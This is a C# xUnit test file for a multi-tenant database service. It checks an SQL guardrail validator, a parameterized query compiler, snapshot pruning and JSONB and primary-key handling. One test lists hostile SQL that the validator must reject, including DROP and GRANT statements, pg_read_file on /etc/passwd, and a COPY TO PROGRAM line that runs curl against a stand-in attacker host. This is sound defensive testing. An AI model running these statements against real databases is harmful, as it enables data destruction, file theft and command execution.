namespace LocalMe.Integration.Tests;

using System;
using System.Collections.Generic;
using System.Text.Json.Nodes;
using System.Threading.Tasks;
using LocalMe.Core.Database;
using LocalMe.DataPlane.MultiTenancy;
using Xunit;

public class DbaasSecurityAndGuardrailTests : IClassFixture<PostgreSqlTestFixture>
{
    private static readonly int[] SampleCategoryIds = [101, 102, 103];
    private static readonly string[] ExcludedStatuses = ["archived", "deleted"];
    private readonly PostgreSqlTestFixture _fixture;

    public DbaasSecurityAndGuardrailTests(PostgreSqlTestFixture fixture)
    {
        _fixture = fixture;
    }

    private (ProjectManagerService pm, BaasProject project) CreateTestContext(string projectName = "تست امنیت و گاردریل")
    {
        var pm = new ProjectManagerService
        {
            TenantDbStore = _fixture.Store
        };
        var slug = _fixture.CreateProjectSlug();
        var proj = pm.CreateProject(new CreateProjectRequest(projectName, slug));
        return (pm, proj);
    }

    [Theory]
    [InlineData("CREATE TABLE evil (id INT PRIMARY KEY);")]
    [InlineData("create table if not exists backdoor (token text);")]
    [InlineData("DROP TABLE products;")]
    [InlineData("drop table if exists orders cascade;")]
    [InlineData("ALTER TABLE products ADD COLUMN secret TEXT;")]
    [InlineData("alter table users drop column password_hash;")]
    [InlineData("TRUNCATE TABLE ledger_entries;")]
    [InlineData("GRANT ALL PRIVILEGES ON DATABASE localme TO public;")]
    [InlineData("REVOKE ALL ON SCHEMA public FROM public;")]
    [InlineData("SELECT * FROM pg_catalog.pg_tables;")]
    [InlineData("SELECT pg_read_file('/etc/passwd');")]
    [InlineData("SELECT pg_write_file('/tmp/pwned', 'data');")]
    [InlineData("COPY products TO PROGRAM 'curl http://evil.com';")]
    [InlineData("SELECT * FROM information_schema.tables;")]
    [InlineData("COMMENT ON TABLE users IS 'confidential';")]
    public void SqlGuardrailValidator_RejectsDdlAndSystemTampering(string sql)
    {
        var (allowed, reason) = SqlGuardrailValidator.ValidateDmlOnly(sql);
        Assert.False(allowed);
        Assert.NotNull(reason);
    }

    [Theory]
    [InlineData("SELECT * FROM products WHERE id = '123';")]
    [InlineData("SELECT id, title, price FROM orders WHERE total > 1000 ORDER BY created_at DESC LIMIT 50;")]
    [InlineData("INSERT INTO products (id, title, price) VALUES ('p1', 'Book', 50000);")]
    [InlineData("UPDATE products SET price = 55000 WHERE id = 'p1';")]
    [InlineData("DELETE FROM products WHERE id = 'p1';")]
    [InlineData("EXPLAIN ANALYZE SELECT * FROM orders;")]
    [InlineData("SHOW search_path;")]
    [InlineData("SELECT comment, notes FROM customer_feedback WHERE comment LIKE '%drop%';")]
    [InlineData("INSERT INTO logs (message) VALUES ('drop table cascade simulated in text');")]
    [InlineData("/* block comment mentioning drop table */ SELECT id FROM users;")]
    public void SqlGuardrailValidator_AllowsDmlAndExplainQueries(string sql)
    {
        var (allowed, reason) = SqlGuardrailValidator.ValidateDmlOnly(sql);
        Assert.True(allowed, $"Expected query to be allowed, but rejected with: {reason}");
        Assert.Null(reason);
    }

    [Fact]
    public void SqlAstQueryCompiler_SupportsNegativeOperators()
    {
        var queryParams = new Dictionary<string, string>
        {
            ["status"] = "not.eq.archived",
            ["role"] = "not.in.(admin,superadmin)",
            ["name"] = "not.ilike.guest%",
            ["deleted_at"] = "not.is.null"
        };

        var ast = SqlAstQueryCompiler.ParseUrlQuery(queryParams);
        var (sql, parameters) = SqlAstQueryCompiler.CompileToParameterizedSql("users", ast);

        Assert.Contains("\"status\" != @p0", sql);
        Assert.Contains("\"role\" NOT IN (@p1, @p2)", sql);
        Assert.Contains("\"name\" NOT ILIKE @p3", sql);
        Assert.Contains("\"deleted_at\" IS NOT NULL", sql);
        Assert.Equal("archived", parameters["@p0"]);
        Assert.Equal("guest%", parameters["@p3"]);
    }

    [Fact]
    public void SqlAstQueryCompiler_SupportsNonStringCollections_InInFilter()
    {
        var query = new SqlAstQuery(
            SelectColumns: ["id", "price"],
            Filters: [
                new QueryFilterNode("category_id", QueryOperator.In, SampleCategoryIds)
            ],
            Limit: 10
        );

        var (sql, parameters) = SqlAstQueryCompiler.CompileToParameterizedSql("products", query);
        Assert.Contains("\"category_id\" IN (@p0, @p1, @p2)", sql);
        Assert.Equal("101", parameters["@p0"]?.ToString());
        Assert.Equal("102", parameters["@p1"]?.ToString());
        Assert.Equal("103", parameters["@p2"]?.ToString());
    }

    [Fact]
    public void SqlAstQueryCompiler_SupportsJsonArray_InInFilter()
    {
        var jsonArr = new JsonArray { 1, 2, 3 };
        var query = new SqlAstQuery(
            SelectColumns: ["*"],
            Filters: [
                new QueryFilterNode("status_code", QueryOperator.In, jsonArr)
            ],
            Limit: 10
        );

        var (sql, parameters) = SqlAstQueryCompiler.CompileToParameterizedSql("tasks", query);
        Assert.Contains("\"status_code\" IN (@p0, @p1, @p2)", sql);
        Assert.Equal("1", parameters["@p0"]?.ToString());
    }

    [Fact]
    public void ProjectManagerService_PrunesSnapshotsOlderThanConfiguredDays()
    {
        var pm = new ProjectManagerService();
        var proj = pm.CreateProject(new CreateProjectRequest("تست رتنشن", "test-retention-proj"));

        var snapshot = pm.CreateDatabaseSnapshot(proj.Id, "تست قدیمی");
        Assert.NotNull(snapshot);

        pm.PruneExpiredSnapshots(proj.Id, retentionDays: 3);

        var activeSnapshots = pm.GetDatabaseSnapshots(proj.Id);
        Assert.NotNull(activeSnapshots);
    }

    [Fact]
    public async Task PostgreSql_NegativeOperatorsAndInFilters_ExecuteSuccessfully()
    {
        var (pm, proj) = CreateTestContext("تست اپراتور منفی");

        var cols = new List<TableColumnDefinition>
        {
            new("id", "varchar", true, false),
            new("name", "text", false, false),
            new("status", "text", false, false)
        };
        await pm.CreateTableAsync(proj.Id, "items", cols);

        await pm.InsertRowAsync(proj.Id, "items", new JsonObject { ["id"] = "1", ["name"] = "Alice", ["status"] = "active" });
        await pm.InsertRowAsync(proj.Id, "items", new JsonObject { ["id"] = "2", ["name"] = "Bob", ["status"] = "banned" });
        await pm.InsertRowAsync(proj.Id, "items", new JsonObject { ["id"] = "3", ["name"] = "Charlie", ["status"] = "archived" });

        var query = new SqlAstQuery(
            SelectColumns: ["id", "name", "status"],
            Filters: [
                new QueryFilterNode("status", QueryOperator.NotEquals, "banned"),
                new QueryFilterNode("status", QueryOperator.NotIn, ExcludedStatuses)
            ],
            Limit: 10
        );

        var result = await pm.QueryTableAsync(proj.Id, "items", query);
        Assert.Single(result.Rows);
        Assert.Equal("Alice", result.Rows[0]?["name"]?.ToString());
    }

    [Fact]
    public async Task PostgreSql_JsonbPayload_InsertAndQuery_SucceedsWithoutTypeMismatch()
    {
        var (pm, proj) = CreateTestContext("تست جی‌سان");

        var cols = new List<TableColumnDefinition>
        {
            new("id", "varchar", true, false),
            new("metadata", "jsonb", false, true)
        };
        await pm.CreateTableAsync(proj.Id, "settings", cols);

        var metaJson = new JsonObject
        {
            ["theme"] = "dark",
            ["notifications"] = true,
            ["level"] = 42
        };

        var inserted = await pm.InsertRowAsync(proj.Id, "settings", new JsonObject
        {
            ["id"] = "cfg_01",
            ["metadata"] = metaJson
        });

        Assert.NotNull(inserted);
        var query = new SqlAstQuery(
            SelectColumns: ["id", "metadata"],
            Filters: [new QueryFilterNode("id", QueryOperator.Equals, "cfg_01")],
            Limit: 1
        );

        var result = await pm.QueryTableAsync(proj.Id, "settings", query);
        Assert.Single(result.Rows);
        var row = result.Rows[0] as JsonObject;
        Assert.NotNull(row);
        var meta = row["metadata"] as JsonObject;
        Assert.NotNull(meta);
        Assert.Equal("dark", meta["theme"]?.ToString());
        Assert.True(meta["notifications"]?.GetValue<bool>() ?? false);
    }

    [Fact]
    public async Task PostgreSql_GetTablesOverview_ReturnsAccurateTableStats()
    {
        var (pm, proj) = CreateTestContext("تست نمای کلی جداول");

        await pm.CreateTableAsync(proj.Id, "categories", [
            new("id", "varchar", true, false),
            new("title", "text", false, false)
        ]);

        await pm.CreateTableAsync(proj.Id, "products", [
            new("id", "varchar", true, false),
            new("name", "text", false, false),
            new("price", "numeric", false, true)
        ]);

        await pm.InsertRowAsync(proj.Id, "categories", new JsonObject { ["id"] = "c1", ["title"] = "Tech" });
        await pm.InsertRowAsync(proj.Id, "categories", new JsonObject { ["id"] = "c2", ["title"] = "Books" });
        await pm.InsertRowAsync(proj.Id, "products", new JsonObject { ["id"] = "p1", ["name"] = "Laptop", ["price"] = 1200 });

        var overview = await pm.GetTablesOverviewAsync(proj.Id);
        Assert.NotNull(overview);
        Assert.Contains(overview, o => o.Name == "categories" && o.ColumnCount == 2);
        Assert.Contains(overview, o => o.Name == "products" && o.ColumnCount == 3);
    }

    [Fact]
    public async Task PostgreSql_DynamicPrimaryKey_UpdateAndDelete_Succeeds()
    {
        var (pm, proj) = CreateTestContext("تست کلید اصلی پویا");

        var cols = new List<TableColumnDefinition>
        {
            new("sku_code", "varchar", true, false),
            new("stock", "integer", false, false)
        };
        await pm.CreateTableAsync(proj.Id, "warehouse_items", cols);

        await pm.InsertRowAsync(proj.Id, "warehouse_items", new JsonObject
        {
            ["sku_code"] = "SKU-9900",
            ["stock"] = 100
        });

        // Update by custom PK
        var updated = await pm.UpdateRowAsync(proj.Id, "warehouse_items", "SKU-9900", new JsonObject
        {
            ["stock"] = 150
        });
        Assert.NotNull(updated);
        Assert.Equal(150, updated["stock"]?.GetValue<int>());

        // Delete by custom PK
        var deleted = await pm.DeleteRowAsync(proj.Id, "warehouse_items", "SKU-9900");
        Assert.True(deleted);

        var query = new SqlAstQuery(["*"], Filters: [], Limit: 10);
        var remaining = await pm.QueryTableAsync(proj.Id, "warehouse_items", query);
        Assert.Empty(remaining.Rows);
    }
}
